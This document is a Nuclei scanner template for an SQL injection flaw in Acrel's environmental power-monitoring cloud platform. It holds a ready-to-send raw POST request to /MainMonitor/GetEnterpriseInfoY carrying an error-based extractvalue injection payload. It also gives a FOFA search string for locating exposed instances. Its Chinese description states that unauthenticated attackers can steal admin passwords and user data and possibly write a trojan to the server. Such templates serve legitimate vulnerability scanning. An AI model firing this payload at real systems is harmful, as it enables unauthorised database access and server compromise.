http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 'XPATH syntax error:'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /MainMonitor/GetEnterpriseInfoY HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
          X-Requested-With: XMLHttpRequest
          Accept-Encoding: gzip, deflate
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
          Accept: text/plain, */*; q=0.01

          EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cuser%28%29%29%29and%27&Type=4
id: ankerui-GetEnterpriseInfoY-sql
info:
    author: Superhero
    description: |-
        fofa: body="myCss/phone.css"
        安科瑞环保用电监管云平台 GetEnterpriseInfoY 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 安科瑞环保用电监管云平台 GetEnterpriseInfoY SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/PxSStyl1t4r1RdVsxDTFpw?token=564303397&lang=zh_CN
    severity: high
    tags: []
